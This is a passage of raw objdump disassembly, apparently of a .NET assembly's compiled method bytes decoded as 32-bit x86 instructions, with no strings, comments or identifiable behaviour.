  402b53:	00 37                	add    %dh,(%edi)
  402b55:	00 00                	add    %al,(%eax)
  402b57:	00 07                	add    %al,(%edi)
  402b59:	00 00                	add    %al,(%eax)
  402b5b:	11 12                	adc    %edx,(%edx)
  402b5d:	00 28                	add    %ch,(%eax)
  402b5f:	1b 00                	sbb    (%eax),%eax
  402b61:	00 0a                	add    %cl,(%edx)
  402b63:	7d 22                	jge    0x402b87
  402b65:	00 00                	add    %al,(%eax)
  402b67:	04 12                	add    $0x12,%al
  402b69:	00 03                	add    %al,(%ebx)
  402b6b:	7d 23                	jge    0x402b90
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	04 12                	add    $0x12,%al
  402b71:	00 15 7d 21 00 00    	add    %dl,0x217d
  402b77:	04 12                	add    $0x12,%al
  402b79:	00 7c 22 00          	add    %bh,0x0(%edx,%eiz,1)
  402b7d:	00 04 12             	add    %al,(%edx,%edx,1)
  402b80:	00 28                	add    %ch,(%eax)
  402b82:	07                   	pop    %es
  402b83:	00 00                	add    %al,(%eax)
  402b85:	2b 12                	sub    (%edx),%edx
  402b87:	00 7c 22 00          	add    %bh,0x0(%edx,%eiz,1)
  402b8b:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b8e:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402b93:	00 13                	add    %dl,(%ebx)
  402b95:	30 02                	xor    %al,(%edx)
  402b97:	00 37                	add    %dh,(%edi)
  402b99:	00 00                	add    %al,(%eax)
  402b9b:	00 08                	add    %cl,(%eax)
  402b9d:	00 00                	add    %al,(%eax)
  402b9f:	11 12                	adc    %edx,(%edx)
  402ba1:	00 28                	add    %ch,(%eax)
  402ba3:	1b 00                	sbb    (%eax),%eax
  402ba5:	00 0a                	add    %cl,(%edx)
  402ba7:	7d 2d                	jge    0x402bd6
  402ba9:	00 00                	add    %al,(%eax)
  402bab:	04 12                	add    $0x12,%al
  402bad:	00 02                	add    %al,(%edx)
  402baf:	7d 2e                	jge    0x402bdf
  402bb1:	00 00                	add    %al,(%eax)
  402bb3:	04 12                	add    $0x12,%al
  402bb5:	00 15 7d 2c 00 00    	add    %dl,0x2c7d
  402bbb:	04 12                	add    $0x12,%al
  402bbd:	00 7c 2d 00          	add    %bh,0x0(%ebp,%ebp,1)
  402bc1:	00 04 12             	add    %al,(%edx,%edx,1)
  402bc4:	00 28                	add    %ch,(%eax)
  402bc6:	08 00                	or     %al,(%eax)
  402bc8:	00 2b                	add    %ch,(%ebx)
  402bca:	12 00                	adc    (%eax),%al
  402bcc:	7c 2d                	jl     0x402bfb
  402bce:	00 00                	add    %al,(%eax)
  402bd0:	04 28                	add    $0x28,%al
  402bd2:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402bd7:	00 13                	add    %dl,(%ebx)
  402bd9:	30 02                	xor    %al,(%edx)
  402bdb:	00 3f                	add    %bh,(%edi)
  402bdd:	00 00                	add    %al,(%eax)
  402bdf:	00 09                	add    %cl,(%ecx)
  402be1:	00 00                	add    %al,(%eax)
  402be3:	11 12                	adc    %edx,(%edx)
  402be5:	00 28                	add    %ch,(%eax)
  402be7:	1b 00                	sbb    (%eax),%eax
  402be9:	00 0a                	add    %cl,(%edx)
  402beb:	7d 32                	jge    0x402c1f
  402bed:	00 00                	add    %al,(%eax)
  402bef:	04 12                	add    $0x12,%al
  402bf1:	00 02                	add    %al,(%edx)
  402bf3:	7d 34                	jge    0x402c29
  402bf5:	00 00                	add    %al,(%eax)
  402bf7:	04 12                	add    $0x12,%al
  402bf9:	00 03                	add    %al,(%ebx)
  402bfb:	7d 33                	jge    0x402c30
  402bfd:	00 00                	add    %al,(%eax)
  402bff:	04 12                	add    $0x12,%al
  402c01:	00 15 7d 31 00 00    	add    %dl,0x317d
  402c07:	04 12                	add    $0x12,%al
  402c09:	00 7c 32 00          	add    %bh,0x0(%edx,%esi,1)
  402c0d:	00 04 12             	add    %al,(%edx,%edx,1)
  402c10:	00 28                	add    %ch,(%eax)
  402c12:	09 00                	or     %eax,(%eax)
  402c14:	00 2b                	add    %ch,(%ebx)
  402c16:	12 00                	adc    (%eax),%al
  402c18:	7c 32                	jl     0x402c4c
  402c1a:	00 00                	add    %al,(%eax)
  402c1c:	04 28                	add    $0x28,%al
  402c1e:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402c23:	00 13                	add    %dl,(%ebx)
  402c25:	30 02                	xor    %al,(%edx)
  402c27:	00 3f                	add    %bh,(%edi)
  402c29:	00 00                	add    %al,(%eax)
  402c2b:	00 0a                	add    %cl,(%edx)
  402c2d:	00 00                	add    %al,(%eax)
  402c2f:	11 12                	adc    %edx,(%edx)
  402c31:	00 28                	add    %ch,(%eax)
  402c33:	1b 00                	sbb    (%eax),%eax
  402c35:	00 0a                	add    %cl,(%edx)
  402c37:	7d 41                	jge    0x402c7a
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	04 12                	add    $0x12,%al
  402c3d:	00 03                	add    %al,(%ebx)
  402c3f:	7d 42                	jge    0x402c83
  402c41:	00 00                	add    %al,(%eax)
  402c43:	04 12                	add    $0x12,%al
  402c45:	00 04 7d 43 00 00 04 	add    %al,0x4000043(,%edi,2)
  402c4c:	12 00                	adc    (%eax),%al
  402c4e:	15 7d 40 00 00       	adc    $0x407d,%eax
  402c53:	04 12                	add    $0x12,%al
  402c55:	00 7c 41 00          	add    %bh,0x0(%ecx,%eax,2)
  402c59:	00 04 12             	add    %al,(%edx,%edx,1)
  402c5c:	00 28                	add    %ch,(%eax)
  402c5e:	0a 00                	or     (%eax),%al
  402c60:	00 2b                	add    %ch,(%ebx)
  402c62:	12 00                	adc    (%eax),%al
  402c64:	7c 41                	jl     0x402ca7
  402c66:	00 00                	add    %al,(%eax)
  402c68:	04 28                	add    $0x28,%al
  402c6a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402c6f:	00 13                	add    %dl,(%ebx)
  402c71:	30 02                	xor    %al,(%edx)
  402c73:	00 3f                	add    %bh,(%edi)
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 0b                	add    %cl,(%ebx)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	11 12                	adc    %edx,(%edx)
  402c7d:	00 28                	add    %ch,(%eax)
  402c7f:	1b 00                	sbb    (%eax),%eax
  402c81:	00 0a                	add    %cl,(%edx)
  402c83:	7d 3b                	jge    0x402cc0
  402c85:	00 00                	add    %al,(%eax)
  402c87:	04 12                	add    $0x12,%al
  402c89:	00 02                	add    %al,(%edx)
  402c8b:	7d 3d                	jge    0x402cca
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	04 12                	add    $0x12,%al
  402c91:	00 03                	add    %al,(%ebx)
  402c93:	7d 3c                	jge    0x402cd1
  402c95:	00 00                	add    %al,(%eax)
  402c97:	04 12                	add    $0x12,%al
  402c99:	00 15 7d 3a 00 00    	add    %dl,0x3a7d
  402c9f:	04 12                	add    $0x12,%al
  402ca1:	00 7c 3b 00          	add    %bh,0x0(%ebx,%edi,1)
  402ca5:	00 04 12             	add    %al,(%edx,%edx,1)
  402ca8:	00 28                	add    %ch,(%eax)
  402caa:	0b 00                	or     (%eax),%eax
  402cac:	00 2b                	add    %ch,(%ebx)
  402cae:	12 00                	adc    (%eax),%al
  402cb0:	7c 3b                	jl     0x402ced
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	04 28                	add    $0x28,%al
  402cb6:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402cbb:	00 13                	add    %dl,(%ebx)
  402cbd:	30 02                	xor    %al,(%edx)
  402cbf:	00 47 00             	add    %al,0x0(%edi)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	0c 00                	or     $0x0,%al
  402cc6:	00 11                	add    %dl,(%ecx)
  402cc8:	12 00                	adc    (%eax),%al
  402cca:	28 1b                	sub    %bl,(%ebx)
  402ccc:	00 00                	add    %al,(%eax)
  402cce:	0a 7d 1c             	or     0x1c(%ebp),%bh
  402cd1:	00 00                	add    %al,(%eax)
  402cd3:	04 12                	add    $0x12,%al
  402cd5:	00 02                	add    %al,(%edx)
  402cd7:	7d 1f                	jge    0x402cf8
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	04 12                	add    $0x12,%al
  402cdd:	00 03                	add    %al,(%ebx)
  402cdf:	7d 1e                	jge    0x402cff
  402ce1:	00 00                	add    %al,(%eax)
  402ce3:	04 12                	add    $0x12,%al
  402ce5:	00 04 7d 1d 00 00 04 	add    %al,0x400001d(,%edi,2)
  402cec:	12 00                	adc    (%eax),%al
  402cee:	15 7d 1b 00 00       	adc    $0x1b7d,%eax
  402cf3:	04 12                	add    $0x12,%al
  402cf5:	00 7c 1c 00          	add    %bh,0x0(%esp,%ebx,1)
  402cf9:	00 04 12             	add    %al,(%edx,%edx,1)
  402cfc:	00 28                	add    %ch,(%eax)
  402cfe:	0c 00                	or     $0x0,%al
  402d00:	00 2b                	add    %ch,(%ebx)
  402d02:	12 00                	adc    (%eax),%al
  402d04:	7c 1c                	jl     0x402d22
  402d06:	00 00                	add    %al,(%eax)
  402d08:	04 28                	add    $0x28,%al
  402d0a:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402d0f:	00 13                	add    %dl,(%ebx)
  402d11:	30 02                	xor    %al,(%edx)
  402d13:	00 37                	add    %dh,(%edi)
  402d15:	00 00                	add    %al,(%eax)
  402d17:	00 0d 00 00 11 12    	add    %cl,0x12110000
  402d1d:	00 28                	add    %ch,(%eax)
  402d1f:	1b 00                	sbb    (%eax),%eax
  402d21:	00 0a                	add    %cl,(%edx)
  402d23:	7d 26                	jge    0x402d4b
  402d25:	00 00                	add    %al,(%eax)
  402d27:	04 12                	add    $0x12,%al
  402d29:	00 03                	add    %al,(%ebx)
  402d2b:	7d 27                	jge    0x402d54
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	04 12                	add    $0x12,%al
  402d31:	00 15 7d 25 00 00    	add    %dl,0x257d
  402d37:	04 12                	add    $0x12,%al
  402d39:	00 7c 26 00          	add    %bh,0x0(%esi,%eiz,1)
  402d3d:	00 04 12             	add    %al,(%edx,%edx,1)
  402d40:	00 28                	add    %ch,(%eax)
  402d42:	0d 00 00 2b 12       	or     $0x122b0000,%eax
  402d47:	00 7c 26 00          	add    %bh,0x0(%esi,%eiz,1)
  402d4b:	00 04 28             	add    %al,(%eax,%ebp,1)
  402d4e:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  402d53:	00 1b                	add    %bl,(%ebx)
  402d55:	30 05 00 fd 01 00    	xor    %al,0x1fd00
  402d5b:	00 0e                	add    %cl,(%esi)
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	11 02                	adc    %eax,(%edx)
  402d61:	7b 15                	jnp    0x402d78
  402d63:	00 00                	add    %al,(%eax)
  402d65:	04 0a                	add    $0xa,%al
  402d67:	02 7b 18             	add    0x18(%ebx),%bh
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	04 0b                	add    $0xb,%al
  402d6e:	06                   	push   %es
  402d6f:	18 26                	sbb    %ah,(%esi)
  402d71:	26 00 06             	add    %al,%es:(%esi)
  402d74:	45                   	inc    %ebp
  402d75:	03 00                	add    (%eax),%eax
  402d77:	00 00                	add    %al,(%eax)
  402d79:	5f                   	pop    %edi
  402d7a:	00 00                	add    %al,(%eax)
  402d7c:	00 e5                	add    %ah,%ch
  402d7e:	00 00                	add    %al,(%eax)
  402d80:	00 51 01             	add    %dl,0x1(%ecx)
  402d83:	00 00                	add    %al,(%eax)
  402d85:	02 7b 17             	add    0x17(%ebx),%bh
  402d88:	00 00                	add    %al,(%eax)
  402d8a:	04 17                	add    $0x17,%al
  402d8c:	91                   	xchg   %eax,%ecx
  402d8d:	0c 02                	or     $0x2,%al
  402d8f:	7b 17                	jnp    0x402da8
  402d91:	00 00                	add    %al,(%eax)
  402d93:	04 18                	add    $0x18,%al
  402d95:	91                   	xchg   %eax,%ecx
  402d96:	0d 07 7b 13 00       	or     $0x137b07,%eax
  402d9b:	00 04 08             	add    %al,(%eax,%ecx,1)
  402d9e:	09 07                	or     %eax,(%edi)
  402da0:	fe 06                	incb   (%esi)
  402da2:	13 00                	adc    (%eax),%eax
  402da4:	00 06                	add    %al,(%esi)
  402da6:	73 4d                	jae    0x402df5
  402da8:	00 00                	add    %al,(%eax)
  402daa:	0a 6f 2f             	or     0x2f(%edi),%ch
  402dad:	00 00                	add    %al,(%eax)
  402daf:	06                   	push   %es
  402db0:	6f                   	outsl  %ds:(%esi),(%dx)
  402db1:	4e                   	dec    %esi
  402db2:	00 00                	add    %al,(%eax)
  402db4:	0a 13                	or     (%ebx),%dl
  402db6:	05 12 05 28 4f       	add    $0x4f280512,%eax
  402dbb:	00 00                	add    %al,(%eax)
  402dbd:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  402dc3:	0a 7d 15             	or     0x15(%ebp),%bh
  402dc6:	00 00                	add    %al,(%eax)
  402dc8:	04 02                	add    $0x2,%al
  402dca:	11 05 7d 19 00 00    	adc    %eax,0x197d
  402dd0:	04 02                	add    $0x2,%al
  402dd2:	7c 16                	jl     0x402dea
  402dd4:	00 00                	add    %al,(%eax)
  402dd6:	04 12                	add    $0x12,%al
  402dd8:	05 02 28 0e 00       	add    $0xe2802,%eax
  402ddd:	00 2b                	add    %ch,(%ebx)
  402ddf:	dd 78 01             	fnstsw 0x1(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	02 7b 19             	add    0x19(%ebx),%bh
  402de7:	00 00                	add    %al,(%eax)
  402de9:	04 13                	add    $0x13,%al
  402deb:	05 02 7c 19 00       	add    $0x197c02,%eax
  402df0:	00 04 fe             	add    %al,(%esi,%edi,8)
  402df3:	15 08 00 00 1b       	adc    $0x1b000008,%eax
  402df8:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402dfe:	00 00                	add    %al,(%eax)
  402e00:	04 12                	add    $0x12,%al
  402e02:	05 28 50 00 00       	add    $0x5028,%eax
  402e07:	0a 13                	or     (%ebx),%dl
  402e09:	04 11                	add    $0x11,%al
  402e0b:	04 07                	add    $0x7,%al
  402e0d:	7b 13                	jnp    0x402e22
  402e0f:	00 00                	add    %al,(%eax)
  402e11:	04 7d                	add    $0x7d,%al
  402e13:	48                   	dec    %eax
  402e14:	00 00                	add    %al,(%eax)
  402e16:	04 07                	add    $0x7,%al
  402e18:	7b 13                	jnp    0x402e2d
  402e1a:	00 00                	add    %al,(%eax)
  402e1c:	04 11                	add    $0x11,%al
  402e1e:	04 6f                	add    $0x6f,%al
  402e20:	2d 00 00 06 11       	sub    $0x11060000,%eax
  402e25:	04 7b                	add    $0x7b,%al
  402e27:	4b                   	dec    %ebx
  402e28:	00 00                	add    %al,(%eax)
  402e2a:	04 17                	add    $0x17,%al
  402e2c:	33 62 07             	xor    0x7(%edx),%esp
  402e2f:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402e32:	16                   	push   %ss
  402e33:	00 00                	add    %al,(%eax)
  402e35:	06                   	push   %es
  402e36:	6f                   	outsl  %ds:(%esi),(%dx)
  402e37:	37                   	aaa
  402e38:	00 00                	add    %al,(%eax)
  402e3a:	0a 13                	or     (%ebx),%dl
  402e3c:	06                   	push   %es
  402e3d:	12 06                	adc    (%esi),%al
  402e3f:	28 38                	sub    %bh,(%eax)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  402e49:	0a 7d 15             	or     0x15(%ebp),%bh
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	04 02                	add    $0x2,%al
  402e50:	11 06                	adc    %eax,(%esi)
  402e52:	7d 1a                	jge    0x402e6e
  402e54:	00 00                	add    %al,(%eax)
  402e56:	04 02                	add    $0x2,%al
  402e58:	7c 16                	jl     0x402e70
  402e5a:	00 00                	add    %al,(%eax)
  402e5c:	04 12                	add    $0x12,%al
  402e5e:	06                   	push   %es
  402e5f:	02 28                	add    (%eax),%ch
  402e61:	0f 00 00             	sldt   (%eax)
  402e64:	2b dd                	sub    %ebp,%ebx
  402e66:	f2 00 00             	repnz add %al,(%eax)
  402e69:	00 02                	add    %al,(%edx)
  402e6b:	7b 1a                	jnp    0x402e87
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	04 13                	add    $0x13,%al
  402e71:	06                   	push   %es
  402e72:	02 7c 1a 00          	add    0x0(%edx,%ebx,1),%bh
  402e76:	00 04 fe             	add    %al,(%esi,%edi,8)
  402e79:	15 0a 00 00 01       	adc    $0x100000a,%eax
  402e7e:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402e84:	00 00                	add    %al,(%eax)
  402e86:	04 12                	add    $0x12,%al
  402e88:	06                   	push   %es
  402e89:	28 39                	sub    %bh,(%ecx)
  402e8b:	00 00                	add    %al,(%eax)
  402e8d:	0a 2b                	or     (%ebx),%ch
  402e8f:	79 11                	jns    0x402ea2
  402e91:	04 7b                	add    $0x7b,%al
  402e93:	4b                   	dec    %ebx
  402e94:	00 00                	add    %al,(%eax)
  402e96:	04 18                	add    $0x18,%al
  402e98:	33 62 07             	xor    0x7(%edx),%esp
  402e9b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402e9e:	18 00                	sbb    %al,(%eax)
  402ea0:	00 06                	add    %al,(%esi)
  402ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ea3:	37                   	aaa
  402ea4:	00 00                	add    %al,(%eax)
  402ea6:	0a 13                	or     (%ebx),%dl
  402ea8:	06                   	push   %es
  402ea9:	12 06                	adc    (%esi),%al
  402eab:	28 38                	sub    %bh,(%eax)
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  402eb5:	0a 7d 15             	or     0x15(%ebp),%bh
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	04 02                	add    $0x2,%al
  402ebc:	11 06                	adc    %eax,(%esi)
  402ebe:	7d 1a                	jge    0x402eda
  402ec0:	00 00                	add    %al,(%eax)
  402ec2:	04 02                	add    $0x2,%al
  402ec4:	7c 16                	jl     0x402edc
  402ec6:	00 00                	add    %al,(%eax)
  402ec8:	04 12                	add    $0x12,%al
  402eca:	06                   	push   %es
  402ecb:	02 28                	add    (%eax),%ch
  402ecd:	0f 00 00             	sldt   (%eax)
  402ed0:	2b dd                	sub    %ebp,%ebx
  402ed2:	86 00                	xchg   %al,(%eax)
  402ed4:	00 00                	add    %al,(%eax)
  402ed6:	02 7b 1a             	add    0x1a(%ebx),%bh
  402ed9:	00 00                	add    %al,(%eax)
  402edb:	04 13                	add    $0x13,%al
  402edd:	06                   	push   %es
  402ede:	02 7c 1a 00          	add    0x0(%edx,%ebx,1),%bh
  402ee2:	00 04 fe             	add    %al,(%esi,%edi,8)
  402ee5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  402eea:	02 15 25 0a 7d 15    	add    0x157d0a25,%dl
  402ef0:	00 00                	add    %al,(%eax)
  402ef2:	04 12                	add    $0x12,%al
  402ef4:	06                   	push   %es
  402ef5:	28 39                	sub    %bh,(%ecx)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	0a 2b                	or     (%ebx),%ch
  402efb:	0d 11 04 2d 02       	or     $0x22d0411,%eax
  402f00:	de 47 11             	fiadds 0x11(%edi)
  402f03:	04 6f                	add    $0x6f,%al
  402f05:	2e 00 00             	add    %al,%cs:(%eax)
  402f08:	06                   	push   %es
  402f09:	de 23                	fisubs (%ebx)
  402f0b:	26 72 41             	es jb  0x402f4f
  402f0e:	00 00                	add    %al,(%eax)
  402f10:	70 02                	jo     0x402f14
  402f12:	7b 17                	jnp    0x402f2b
  402f14:	00 00                	add    %al,(%eax)
  402f16:	04 17                	add    $0x17,%al
  402f18:	8f                   	(bad)
  402f19:	2e 00 00             	add    %al,%cs:(%eax)
  402f1c:	01 28                	add    %ebp,(%eax)
  402f1e:	51                   	push   %ecx
  402f1f:	00 00                	add    %al,(%eax)
  402f21:	0a 28                	or     (%eax),%ch
  402f23:	52                   	push   %edx
  402f24:	00 00                	add    %al,(%eax)
  402f26:	0a 28                	or     (%eax),%ch
  402f28:	29 00                	sub    %eax,(%eax)
  402f2a:	00 0a                	add    %cl,(%edx)
  402f2c:	de 00                	fiadds (%eax)
  402f2e:	de 19                	ficomps (%ecx)
  402f30:	13 07                	adc    (%edi),%eax
  402f32:	02 1f                	add    (%edi),%bl
  402f34:	fe                   	(bad)
  402f35:	7d 15                	jge    0x402f4c
  402f37:	00 00                	add    %al,(%eax)
  402f39:	04 02                	add    $0x2,%al
  402f3b:	7c 16                	jl     0x402f53
  402f3d:	00 00                	add    %al,(%eax)
  402f3f:	04 11                	add    $0x11,%al
  402f41:	07                   	pop    %es
  402f42:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  402f48:	13 02                	adc    (%edx),%eax
  402f4a:	1f                   	pop    %ds
  402f4b:	fe                   	(bad)
  402f4c:	7d 15                	jge    0x402f63
  402f4e:	00 00                	add    %al,(%eax)
  402f50:	04 02                	add    $0x2,%al
  402f52:	7c 16                	jl     0x402f6a
  402f54:	00 00                	add    %al,(%eax)
  402f56:	04 28                	add    $0x28,%al
  402f58:	3e 00 00             	add    %al,%ds:(%eax)
  402f5b:	0a 2a                	or     (%edx),%ch
  402f5d:	00 00                	add    %al,(%eax)
  402f5f:	00 41 34             	add    %al,0x34(%ecx)
  402f62:	00 00                	add    %al,(%eax)
  402f64:	00 00                	add    %al,(%eax)
  402f66:	00 00                	add    %al,(%eax)
  402f68:	13 00                	adc    (%eax),%eax
  402f6a:	00 00                	add    %al,(%eax)
  402f6c:	98                   	cwtl
  402f6d:	01 00                	add    %eax,(%eax)
  402f6f:	00 ab 01 00 00 23    	add    %ch,0x23000001(%ebx)
  402f75:	00 00                	add    %al,(%eax)
  402f77:	00 01                	add    %al,(%ecx)
  402f79:	00 00                	add    %al,(%eax)
  402f7b:	01 00                	add    %eax,(%eax)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	00 0e                	add    %cl,(%esi)
  402f81:	00 00                	add    %al,(%eax)
  402f83:	00 c2                	add    %al,%dl
  402f85:	01 00                	add    %eax,(%eax)
  402f87:	00 d0                	add    %dl,%al
  402f89:	01 00                	add    %eax,(%eax)
  402f8b:	00 19                	add    %bl,(%ecx)
  402f8d:	00 00                	add    %al,(%eax)
  402f8f:	00 0b                	add    %cl,(%ebx)
  402f91:	00 00                	add    %al,(%eax)
  402f93:	01 1b                	add    %ebx,(%ebx)
  402f95:	30 06                	xor    %al,(%esi)
  402f97:	00 30                	add    %dh,(%eax)
  402f99:	02 00                	add    (%eax),%al
  402f9b:	00 0f                	add    %cl,(%edi)
  402f9d:	00 00                	add    %al,(%eax)
  402f9f:	11 02                	adc    %eax,(%edx)
  402fa1:	7b 1b                	jnp    0x402fbe
  402fa3:	00 00                	add    %al,(%eax)
  402fa5:	04 0a                	add    $0xa,%al
  402fa7:	02 7b 1f             	add    0x1f(%ebx),%bh
  402faa:	00 00                	add    %al,(%eax)
  402fac:	04 0b                	add    $0xb,%al
  402fae:	06                   	push   %es
  402faf:	45                   	inc    %ebp
  402fb0:	03 00                	add    (%eax),%eax
  402fb2:	00 00                	add    %al,(%eax)
  402fb4:	83 00 00             	addl   $0x0,(%eax)
  402fb7:	00 45 01             	add    %al,0x1(%ebp)
  402fba:	00 00                	add    %al,(%eax)
  402fbc:	bc 01 00 00 02       	mov    $0x2000001,%esp
  402fc1:	7b 1d                	jnp    0x402fe0
  402fc3:	00 00                	add    %al,(%eax)
  402fc5:	04 17                	add    $0x17,%al
  402fc7:	91                   	xchg   %eax,%ecx
  402fc8:	0c 08                	or     $0x8,%al
  402fca:	45                   	inc    %ebp
  402fcb:	03 00                	add    (%eax),%eax
  402fcd:	00 00                	add    %al,(%eax)
  402fcf:	05 00 00 00 92       	add    $0x92000000,%eax
  402fd4:	00 00                	add    %al,(%eax)
  402fd6:	00 51 01             	add    %dl,0x1(%ecx)
  402fd9:	00 00                	add    %al,(%eax)
  402fdb:	38 c1                	cmp    %al,%cl
  402fdd:	01 00                	add    %eax,(%eax)
  402fdf:	00 02                	add    %al,(%edx)
  402fe1:	7b 1e                	jnp    0x403001
  402fe3:	00 00                	add    %al,(%eax)
  402fe5:	04 28                	add    $0x28,%al
  402fe7:	27                   	daa
  402fe8:	00 00                	add    %al,(%eax)
  402fea:	0a 72 85             	or     -0x7b(%edx),%dh
  402fed:	00 00                	add    %al,(%eax)
  402fef:	70 07                	jo     0x402ff8
  402ff1:	7b 14                	jnp    0x403007
  402ff3:	00 00                	add    %al,(%eax)
  402ff5:	04 7b                	add    $0x7b,%al
  402ff7:	03 00                	add    (%eax),%eax
  402ff9:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402ffc:	53                   	push   %ebx
  402ffd:	00 00                	add    %al,(%eax)
  402fff:	0a 28                	or     (%eax),%ch
  403001:	54                   	push   %esp
  403002:	00 00                	add    %al,(%eax)
  403004:	0a 6f 3b             	or     0x3b(%edi),%ch
  403007:	00 00                	add    %al,(%eax)
  403009:	0a 6f 32             	or     0x32(%edi),%ch
  40300c:	00 00                	add    %al,(%eax)
  40300e:	06                   	push   %es
  40300f:	6f                   	outsl  %ds:(%esi),(%dx)
  403010:	2b 00                	sub    (%eax),%eax
  403012:	00 0a                	add    %cl,(%edx)
  403014:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  40301a:	00 00                	add    %al,(%eax)
  40301c:	0a 2d 41 02 16 25    	or     0x25160241,%ch
  403022:	0a 7d 1b             	or     0x1b(%ebp),%bh
  403025:	00 00                	add    %al,(%eax)
  403027:	04 02                	add    $0x2,%al
  403029:	11 05 7d 20 00 00    	adc    %eax,0x207d
  40302f:	04 02                	add    $0x2,%al
  403031:	7c 1c                	jl     0x40304f
  403033:	00 00                	add    %al,(%eax)
  403035:	04 12                	add    $0x12,%al
  403037:	05 02 28 10 00       	add    $0x102802,%eax
  40303c:	00 2b                	add    %ch,(%ebx)
  40303e:	dd 8c 01 00 00 02 7b 	fisttpll 0x7b020000(%ecx,%eax,1)
  403045:	20 00                	and    %al,(%eax)
  403047:	00 04 13             	add    %al,(%ebx,%edx,1)
  40304a:	05 02 7c 20 00       	add    $0x207c02,%eax
  40304f:	00 04 fe             	add    %al,(%esi,%edi,8)
  403052:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403057:	02 15 25 0a 7d 1b    	add    0x1b7d0a25,%dl
  40305d:	00 00                	add    %al,(%eax)
  40305f:	04 12                	add    $0x12,%al
  403061:	05 28 2d 00 00       	add    $0x2d28,%eax
  403066:	0a 26                	or     (%esi),%ah
  403068:	38 34 01             	cmp    %dh,(%ecx,%eax,1)
  40306b:	00 00                	add    %al,(%eax)
  40306d:	28 27                	sub    %ah,(%edi)
  40306f:	00 00                	add    %al,(%eax)
  403071:	0a 02                	or     (%edx),%al
  403073:	7b 1d                	jnp    0x403092
  403075:	00 00                	add    %al,(%eax)
  403077:	04 18                	add    $0x18,%al
  403079:	28 11                	sub    %dl,(%ecx)
  40307b:	00 00                	add    %al,(%eax)
  40307d:	2b 28                	sub    (%eax),%ebp
  40307f:	12 00                	adc    (%eax),%al
  403081:	00 2b                	add    %ch,(%ebx)
  403083:	6f                   	outsl  %ds:(%esi),(%dx)
  403084:	28 00                	sub    %al,(%eax)
  403086:	00 0a                	add    %cl,(%edx)
  403088:	0d 16 13 04 07       	or     $0x7041316,%eax
  40308d:	7b 14                	jnp    0x4030a3
  40308f:	00 00                	add    %al,(%eax)
  403091:	04 7b                	add    $0x7b,%al
  403093:	03 00                	add    (%eax),%eax
  403095:	00 04 6f             	add    %al,(%edi,%ebp,2)
  403098:	53                   	push   %ebx
  403099:	00 00                	add    %al,(%eax)
  40309b:	0a 09                	or     (%ecx),%cl
  40309d:	28 13                	sub    %dl,(%ebx)
  40309f:	00 00                	add    %al,(%eax)
  4030a1:	2b 2c 13             	sub    (%ebx,%edx,1),%ebp
  4030a4:	07                   	pop    %es
  4030a5:	7b 14                	jnp    0x4030bb
  4030a7:	00 00                	add    %al,(%eax)
  4030a9:	04 7b                	add    $0x7b,%al
  4030ab:	03 00                	add    (%eax),%eax
  4030ad:	00 04 09             	add    %al,(%ecx,%ecx,1)
  4030b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b1:	58                   	pop    %eax
  4030b2:	00 00                	add    %al,(%eax)
  4030b4:	0a 13                	or     (%ebx),%dl
  4030b6:	04 02                	add    $0x2,%al
  4030b8:	7b 1e                	jnp    0x4030d8
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	04 17                	add    $0x17,%al
  4030be:	8d 2e                	lea    (%esi),%ebp
  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	01 25 16 11 04 16    	add    %esp,0x16041116
  4030c8:	fe 03                	incb   (%ebx)
  4030ca:	d2 9c 6f 32 00 00 06 	rcrb   %cl,0x6000032(%edi,%ebp,2)
  4030d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4030d2:	2b 00                	sub    (%eax),%eax
  4030d4:	00 0a                	add    %cl,(%edx)
  4030d6:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  4030dc:	00 00                	add    %al,(%eax)
  4030de:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  4030e4:	0a 7d 1b             	or     0x1b(%ebp),%bh
  4030e7:	00 00                	add    %al,(%eax)
  4030e9:	04 02                	add    $0x2,%al
  4030eb:	11 05 7d 20 00 00    	adc    %eax,0x207d
  4030f1:	04 02                	add    $0x2,%al
  4030f3:	7c 1c                	jl     0x403111
  4030f5:	00 00                	add    %al,(%eax)
  4030f7:	04 12                	add    $0x12,%al
